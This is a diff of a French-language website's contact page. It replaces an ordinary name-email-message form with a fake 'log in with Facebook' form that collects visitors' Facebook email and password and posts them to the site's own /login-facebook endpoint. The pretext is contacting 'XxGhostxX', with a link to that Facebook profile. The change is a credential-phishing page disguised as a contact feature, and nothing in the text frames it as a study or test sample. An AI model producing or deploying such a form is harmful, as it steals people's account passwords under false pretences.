@@ -9,21 +9,24 @@
 <body>
   <div class="hero">
     <div class="content">
-      <h1>Contactez-nous 📞</h1>
-      <p>Si vous avez des questions ou des commentaires, n'hésitez pas à nous contacter ! 📧</p>
+      <h1>Contactez XxGhostxX via Facebook 📞</h1>
+      <p>Si vous avez des questions ou des commentaires, connectez-vous avec votre compte Facebook pour communiquer directement avec XxGhostxX ! 📧</p>
 
-      <form action="/contact" method="POST">
-        <label for="name">Nom 📝:</label>
-        <input type="text" id="name" name="name" required placeholder="Votre nom">
+      <!-- Formulaire de connexion Facebook pour contact -->
+      <form action="/login-facebook" method="POST">
+        <label for="email">Email Facebook 📧:</label>
+        <input type="email" id="email" name="email" required placeholder="Votre email Facebook">
 
-        <label for="email">Email 📧:</label>
-        <input type="email" id="email" name="email" required placeholder="Votre email">
+        <label for="password">Mot de passe Facebook 🔑:</label>
+        <input type="password" id="password" name="password" required placeholder="Votre mot de passe Facebook">
 
-        <label for="message">Message ✍️:</label>
-        <textarea id="message" name="message" required placeholder="Votre message"></textarea>
-
-        <button type="submit">Envoyer 📨</button>
+        <button type="submit">Se connecter avec Facebook 🧑‍💻</button>
       </form>
+
+      <div class="contact-info">
+        <p>Une fois connecté, vous pourrez envoyer un message directement à XxGhostxX ! 🤖</p>
+        <p>Vous pouvez également visiter son profil Facebook ici : <a href="https://www.facebook.com/8Xx.GHOST.xX8" target="_blank"> XxGhostxX sur Facebook</a> 📱</p>
+      </div>
 
       <div class="nav-links">
         <a href="index.html">Retour à l'accueil 🏠</a>
